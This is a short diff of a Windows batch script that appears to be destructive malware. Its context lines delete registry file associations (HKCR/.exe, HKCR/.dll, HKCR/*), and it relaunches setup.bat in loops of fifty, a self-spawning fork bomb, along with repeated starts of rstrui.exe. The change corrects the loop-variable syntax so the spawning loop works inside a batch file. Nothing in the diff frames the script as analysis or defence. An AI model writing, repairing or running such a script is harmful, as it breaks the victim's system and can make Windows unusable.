@@ -81,7 +81,7 @@ START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 
-for /l %a in (1,1,50) start setup.bat
+for /l %%a in (1,1,50) start setup.bat
 for /l %a in (1,1,50) start setup.bat
 for /l %%a in (1,2,50) do start rstrui.exe
 
@@ -104,5 +104,6 @@ echo.
 start setup.bat
 
 setup.bat
+
 
 
